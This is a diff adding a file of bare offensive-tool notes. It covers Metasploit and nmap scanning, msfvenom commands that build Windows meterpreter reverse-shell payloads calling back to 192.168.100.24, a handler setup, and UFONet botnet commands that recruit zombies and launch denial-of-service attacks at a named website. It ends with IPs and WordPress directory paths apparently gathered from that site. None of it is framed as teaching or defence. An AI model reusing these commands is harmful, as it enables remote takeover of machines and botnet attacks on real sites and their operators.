@@ -1,0 +1,39 @@
+msploitego/src/msploitego/resources/maltego/msploitego.mtz
+ln -s /path/to/your/msploitego/src/msploitego/transforms /root/
+
+msf> db_nmap -vvvv -T5 -A -sS -ST -Pn
+msf> db_import /path/to/your/nmapfile.xml
+msf> db_export -f xml /path/to/your/output.xml
+/usr/share/metasploit-framework/config/database.yml
+db_nmap -vvvv -sS -sV -sU -A -T5 1.1.1.1/24
+
+msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.24 -f c > payload.txt
+msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.24 -f num > payload.txt
+
+./ufonet -s 'http://toolst0re.net/wp-admin/login.php?url=' --sa
+./ufonet --sd 'botnet/dorks.txt'
+./ufonet --download-zombies
+./ufonet -t botnet/zombies.txt
+./ufonet -i http://toolst0re.net
+./ufonet -a http://toolst0re.net -r 10 -b "icons/ubuntu-logo.png"
+
+python -m SimpleHTTPServer
+http://192.168.100.24:8000/
+msf > use exploit/multi/handler
+msf > set PAYLOAD windows/meterpreter/reverse_http
+msf > set LHOST /192.168.100.24
+msf > set LPORT 4444
+msf > exploit
+
+<input class="form-control input-lg required" id="wpsevst_user_pass" name="wpsevst_user_pass" type="password"/>
+
+139.99.172.99
+139.99.128.0/17
+http://toolst0re.net/wp-content/themes/wp-script-theme/assets/css/
+http://toolst0re.net/wp-content/themes/wp-script-theme/assets/css/font-awesome/css/
+http://toolst0re.net/wp-content/themes/wp-script-theme/vendor/foundation/
+http://toolst0re.net/wp-content/uploads/
+http://toolst0re.net/wp-includes/js/
+http://toolst0re.net/wp-content/themes/wp-script-theme/assets/js/
+http://toolst0re.net/wp-includes/js/jquery/
+http://toolst0re.net/wp-content/themes/wp-script-theme/vendor/jquery/
